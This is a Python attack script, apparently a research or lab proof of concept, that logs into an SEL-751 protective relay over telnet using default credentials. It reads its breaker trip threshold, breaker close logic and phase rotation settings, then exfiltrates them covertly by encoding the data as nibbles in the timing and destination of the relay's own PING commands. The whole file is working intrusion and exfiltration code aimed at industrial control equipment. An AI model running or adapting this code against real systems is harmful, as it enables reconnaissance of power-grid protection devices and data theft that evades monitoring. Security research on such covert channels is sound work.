import telnetlib
import time
from extra_funcs import packup, convert_bytes_nibs, get_ping_loc, get_command_ID, get_nib


#method to retrieve information and then transmit that data out through ICMP messages
def retrieve_info_send_pings():
    HOST="192.168.1.2"
    
    #retrieve corresponding translation dictionaries
    ping_loc=get_ping_loc()
    commandID=get_command_ID()

    #open connection to compromised PLC
    tn=telnetlib.Telnet(HOST, 23)

    #Use poorly configured default passwords to login
    tn.read_until(b"hello", timeout=3)
    tn.write(b"acc\r")
    tn.read_until(b"Password: ?", timeout=3)
    tn.write(b"*****\r")

    print("Attained first level authentication")


    tn.read_until(b"=>>", timeout=3)
    tn.write(b"2ac\r")
    tn.read_until(b"Password: ?", timeout=3)
    tn.write(b"****\r")

    print("Attained second level authentication")

    
    #Retrieve the first setting 50P1P, this is value at which the relay trips the associated circuit breaker
    tn.read_until(b"=>>", timeout=3)
    tn.write(b"SHOW 50P1P\r")
    
    #Retrieve the second setting BRCLO, which reveals the breaker close command bit
    my_set=tn.read_until(b"\002\r\n", timeout=4)
    tn.write(b"SHOW LOGIC 1\r")
    my_set2=tn.read_until(b"# BREAKER CLOSE\r\n", timeout=4)
    
    #Retrieve the third setting, PHROT (phase rotation)
    tn.write(b"SHOW GLOBAL\r")
    my_set3=tn.read_until(b"FNOM", timeout=4)
    
    #parse out the relevant value portions, this is well defined in the SEL-751 handbook
    current1=my_set.decode("ascii").split(":= ")[1].split("\r")[0]
    print(current1)
    current2=my_set2.decode("ascii").split(":= ")[-1].split(" #")[0]
    print(current2)
    current3=my_set3.decode("ascii").split(":= ")[-1].split(" ")[0]
    print(current3)    
    
    #packup the settings into byte arrays, with booleans for whether the value is a string or float
    ba1,b1=packup(current1)
    ba2,b2=packup(current2)
    ba3,b3=packup(current3)

    #construct array of sequences to be sent, first with the ID nib, followed by the length of the string (if string) and then the corresponding nibs 
    to_send=[]
    to_send.append(b1+commandID['50P1P'])
    if b1=='1':
        to_send.append(get_nib(len(ba1)))
    to_send=to_send+convert_bytes_nibs(ba1)
    to_send.append(b2+commandID['BRCLO'])
    if b2=='1':
        to_send.append(get_nib(len(ba2)))
    to_send=to_send+convert_bytes_nibs(ba2)
    to_send.append(b3+commandID['PHROT'])
    if b3=='1':
        to_send.append(get_nib(len(ba3)))
    to_send=to_send+convert_bytes_nibs(ba3)
    print(to_send)

    #For loop for transmitting commands on PLC
    #prints out byte command for tracking of current place in transmission (helps for troubleshooting)
    #sends the ping command for 2 minutes, but after 60 seconds, cuts it off with a "q\r" command
    time.sleep(3)
    for i in range(len(to_send)):
        location, interval=ping_loc[to_send[i]]
        byte_command=(b'PING '+location.encode()+b" I"+interval.encode()+b" T2\r")
        print(byte_command)
        tn.write(byte_command)
        time.sleep(60)
        tn.write(b"q\r")

    tn.write(b"exit\r")

#calling the method defined above
retrieve_info_send_pings()
